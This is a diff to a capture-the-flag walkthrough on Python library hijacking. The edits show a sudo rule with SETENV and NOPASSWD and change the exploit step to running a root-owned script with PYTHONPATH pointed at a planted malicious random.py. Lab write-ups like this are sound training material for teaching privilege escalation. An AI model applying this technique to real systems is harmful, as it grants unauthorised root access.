@@ -64,18 +64,11 @@ Password: password
 - Output:
     
     ```
-    (ALL) NOPASSWD: /usr/bin/python3 vulnerable_script.py
+    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/scripts/vulnerable_script.py
     ```
     
-- This means `ctfuser` can execute `vulnerable_script.py` **as root** without a password.
+- This means `ctfuser` can set the environment and execute `vulnerable_script.py` **as root** without a password.
 
-**3️⃣ Find the vulnerable script:** use the following command to locate the script:
-
-```bash
-find / -name vulnerable_script.py 2>/dev/null
-```
-
-This means `vulnerable_script.py` is in `/opt/scripts`
 
 **4️⃣ Analyzing the Vulnerable Script**
 
@@ -130,7 +123,7 @@ This means `vulnerable_script.py` is in `/opt/scripts`
 
 5️⃣ **Exploiting Library Hijacking**
 
-- We create a **malicious version** of `random.py` in `/tmp`:
+- We create a **malicious version** of `random.py`:
     
     ```
     mkdir ~/hijack
@@ -141,8 +134,7 @@ This means `vulnerable_script.py` is in `/opt/scripts`
 - Set the `PYTHONPATH` to prioritize our malicious library:
     
     ```
-    PYTHONPATH=/home/ctfuser/hijack/
-    sudo /usr/bin/python3 vulnerable_script.py
+    sudo PYTHONPATH=. /usr/bin/python3 /opt/scripts/vulnerable_script.py
     
     ```
     
